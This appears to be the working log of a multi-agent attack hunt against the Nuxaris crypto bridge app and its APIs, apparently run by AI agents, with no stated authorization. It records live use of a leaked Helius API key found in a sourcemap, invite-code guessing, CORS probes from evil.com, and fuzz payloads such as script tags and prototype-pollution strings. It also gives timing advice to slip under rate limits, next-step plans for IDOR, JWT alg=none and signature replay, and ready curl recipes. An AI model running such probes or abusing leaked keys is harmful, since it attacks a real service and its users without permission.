# Nuxaris Exhaustive Chain Hunt — 70m, 4 CDC Agents, Dual Rate-Limit (2026-08-16 R2)

## Target
- `https://app.nuxaris.com` CRA `main.040e5d2d.js` 1.78MB + `main.js.map` 6.89MB 731 sources
- Auth `https://auth.nuxarisapiv1.xyz` Caddy `health → {service:api-accounts}` `CSP default-src 'self'` `X-Frame SAMEORIGIN`
- Bridge `https://nuxarisapiv1.xyz/api/bridge` Caddy `via:1.1 Caddy` IP `37.27.59.179` Hetzner
- Purpose: Canton `CC.canton` ↔ EVM `ETH.ethereum/ETH.base/SOL.solana` via Kraken legs

## 4-Agent CDC (divergent, 10+ rounds, stall=BLOCK)
- Architect: sourcemap + asset-manifest 150 chunks + `REACT_APP_AUTH_API_URL/BRIDGE_API/authFetch/apiFetch` wrappers, trust graph 6 TBs (JWT localStorage + 30s prepare hash vs `nuxaris-login:` namespace `wallet/signing.ts:30`)
- Red: auth bypass/JWT/IDOR/CORS — every private `GET /api/auth/me`, `wallet/provisioning|init|topology-submit|preapproval/*`, `bridge/order/:id`, `orders?page=`, `wallet/status|addresses`, `POST order/erc20|canton` → `401 Missing Authorization` / `404` without Bearer; CORS `evil.com` → auth 500 crash no ACAO, bridge 200 no ACAO (strict allowlist `app.nuxaris.com`)
- Fuzz: `quote?tokenA=<script>/{{7*7}}/";DROP&tokenB=CC.canton&amount=-1/__proto__` → `400 Unknown token / amount must be positive` / `200` ignored; no File/FormData/multipart sink; `amount=0/Infinity/NaN/null` → 400; `__proto__[polluted]=1` → 200 no persist
- Chainer: longest handoff `sourcemap leak → Helius key → getHealth/getBalance` = billing abuse only; `POST bridge/order/canton` pre-auth → `404` not `401` (route needs auth wrapper); no BugA→BugB RCE handoff proven

## Dual Rate Limits (the bottleneck)
- Auth `10;w=60` (`ratelimit-limit:10 remaining 9..0 reset:60`) — 10 probes in 60s → `429 Too many requests` hides `400/200` verdicts; Bridge `60;w=60` (`remaining 59..43`)
- Fix: `sleep 7` between auth probes, `sleep 65` after 429, read `ratelimit-remaining/reset` header; interleaving `curl -sk -D headers.txt` captures vary/ACAO/ratelimit
- Evidence: `POST account-state {"email":"nonexistent@test.com"} → 429` after burst; after `sleep 65` → `{"error":"email is required"}` / `{"error":"Invalid invite code"}` again; `bridge/tokens` stays 200 while auth 429 (separate buckets)

## Hardcoded Secret — Helius LIVE
- `REACT_APP_SOLANA_RPC=https://mainnet.helius-rpc.com/?api-key=<REDACTED-API-KEY>` in `main.js` `process.env` (6 hits)
- Live: `curl -X POST https://mainnet.helius-rpc.com/?api-key=... -d '{"jsonrpc":"2.0","id":1,"method":"getHealth"}' → {"result":"ok"}`
- `getVersion → {"feature-set":4119855713,"solana-core":"4.2.0-rc.1"}` `getBalance 1111… → 26731424560`
- Impact: cost exhaustion / DoS Solana features; mitigate rotate + server proxy

## Bridge Public vs Private
- Public unauth 200: `GET tokens → {tokens:[ETH.ethereum,CC.canton,ETH.base,SOL.solana]}` `routes → [ETH.ethereum→CC.canton 30m limits 0.01-5 ETH]` `quote?ETH.ethereum&CC.canton&amount=1 → {amountOut:19414, fees:{bridgeFee 0.25%, exchangeTradingFee 0.1%/0.2% kucoin}}` `price/CC → {priceUsd:0.09629}`
- Private 401: `GET orders`, `order/:id`, `wallet/status|addresses|balance`, `POST order/erc20|canton` all `{"error":"Missing or invalid Authorization header"}`; verified with `Origin:evil.com` + `Origin:app...` — same 401
- No 200 HTML fallback on bridge (Express 404 JSON), unlike Vercel SPA shell `1605B` `<!DOCTYPE` on `/` (no `__NEXT_DATA__`)

## CORS Detail
- `curl -H Origin:https://app.nuxaris.com https://auth.../health -i → access-control-allow-origin: https://app.nuxaris.com` `allow-credentials:true` `vary:Origin` 200; `Origin:evil.com` same path `POST account-state → 500 Internal server error` no ACAO (crash, not reflect); `Origin:evil.com` `GET bridge/tokens → 200` no ACAO header at all (allowlist strict) — not `*`
- `OPTIONS` on both → `204` `allow-origin: https://app.nuxaris.com` `allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE` when good origin, otherwise 500

## Invite Gate + Enumeration
- `POST register {username,email,invite_code:""} → 400 username, email and invite_code are required`
- `invite_code="nuxaris/Nuxaris/NUXARIS/test/0/admin/invite/WELCOME/EARLY/BETA" → 400 Invalid invite code` then 429 after 4 hits; blocks mass account creation
- Enumeration oracle `account-state {email}` → `{step:"unknown"}` exists but 429 throttles to LOW

## Infra Probes
- `37.27.59.179` Hetzner FIN `static.179.59.27.37.clients.your-server.de` Helsinki; `http://37.27.59.179/ Host:auth... → 308 → https://auth...`; no Caddy version leak; `via:1.1 Caddy` `alt-svc:h3=":443"; ma=2592000` `CLP same-origin`
- `www.nuxaris.com` Vercel Next marketing `60767B vary:RSC Next-Router-State-Tree` `x-matched-path:/`; GitHub `Clickpaw/Nuxaris` 404 private; `nuxaris-91rna9dx7-clickpaws-projects.vercel.app → 302 vercel sso` (preview gated)
- `docs/swagger/openapi/api-docs/healthz/ready/metrics` on both APIs → `404 Cannot GET` except `/health`; `version` 404

## Vault + JWT (from sourcemap)
- `localStorage access_token/refresh_token` Bearer; 401 → `POST /api/auth/refresh {refresh_token}` retry once else removeItem
- `IndexedDB nuxaris-wallet/vaults` AES-256-GCM `salt16 iv12 tag128` PBKDF2-SHA256 600k `AAD nuxaris-vault:v{version}:{accountId}`; `localStorage nuxaris_vault_accounts` email→UUID, `nuxaris_hide_values`; signing `ed25519` `signLoginNonce` prefix `nuxaris-login:` vs 32-byte base64 `signPreparedTx` vs hex topology 40-140 — prevents cross-sign

## Verdict
- **No pre-auth RCE chain PROVEN** in 70m/10+ rounds under 10/60 throttle; all handoffs BLOCKED at 401/400
- **2 PROVEN**: Helius key billing abuse HIGH + sourcemap 6.89MB full leak HIGH + CORS evil 500 LOW + invite/401 gates LOW
- Next: Plan A valid invite → 2 accounts → IDOR/JWT none/alg; Plan B login-key nonce/signature replay + 30s prepare TTL; Plan C 6h low-noise 1/7s + Host confusion

## Recipes
```bash
curl -sk -A "Mozilla/5.0 Firefox/128.0" https://app.nuxaris.com/static/js/main.040e5d2d.js.map -o m.map
python3 -c "import json; print([s for s in json.load(open('m.map'))['sources'] if 'src/' in s])"
curl -sk -A "Mozilla/5.0" -H "Origin: https://app.nuxaris.com" https://nuxarisapiv1.xyz/api/bridge/tokens
curl -sk -H "Origin: https://evil.com" -D - https://auth.nuxarisapiv1.xyz/api/auth/account-state -X POST -H "Content-Type: application/json" -d '{"email":"t@t.com"}'
curl -sk -X POST https://mainnet.helius-rpc.com/?api-key=<REDACTED-API-KEY> -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","id":1,"method":"getHealth"}'
```
